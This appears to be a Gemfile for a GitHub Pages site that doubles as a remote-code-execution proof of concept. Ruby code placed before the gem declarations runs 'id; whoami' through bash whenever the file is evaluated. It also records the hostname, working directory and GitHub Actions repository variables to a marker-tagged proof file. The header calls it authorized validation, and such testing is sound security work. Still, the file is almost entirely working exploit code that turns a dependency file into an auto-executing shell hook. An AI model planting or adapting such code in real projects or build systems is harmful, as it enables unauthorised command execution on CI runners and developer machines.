# Authorized bounded GitHub Pages Gemfile RCE validation.
require "open3"
marker = "PAGES_GEMFILE_RCE_20260919143711-7ebcb9"
cmd = "id; whoami"
stdout, stderr, status = Open3.capture3("/bin/bash", "-lc", cmd)
proof = []
proof << "marker=#{marker}"
proof << "utc=#{Time.now.utc.strftime('%Y-%m-%dT%H:%M:%SZ')}"
proof << "cmd=#{cmd}"
proof << "exit=#{status.exitstatus}"
proof << "--- stdout ---"
proof << stdout
proof << "--- stderr ---"
proof << stderr
proof << "--- context ---"
proof << "id=#{%x(id).strip}"
proof << "whoami=#{%x(whoami).strip}"
proof << "hostname=#{%x(hostname).strip}"
proof << "ruby=#{RUBY_VERSION}"
proof << "pwd=#{Dir.pwd}"
proof << "GITHUB_ACTION_REPOSITORY=#{ENV.fetch('GITHUB_ACTION_REPOSITORY', '<unset>')}"
proof << "GITHUB_ACTION_REF=#{ENV.fetch('GITHUB_ACTION_REF', '<unset>')}"
proof << "GITHUB_REPOSITORY=#{ENV.fetch('GITHUB_REPOSITORY', '<unset>')}"
File.write(File.join(__dir__, "pages-gemfile-rce-20260919143711-7ebcb9.txt"), proof.join("\n") + "\n")
source "https://rubygems.org"
gem "github-pages", "= 232"
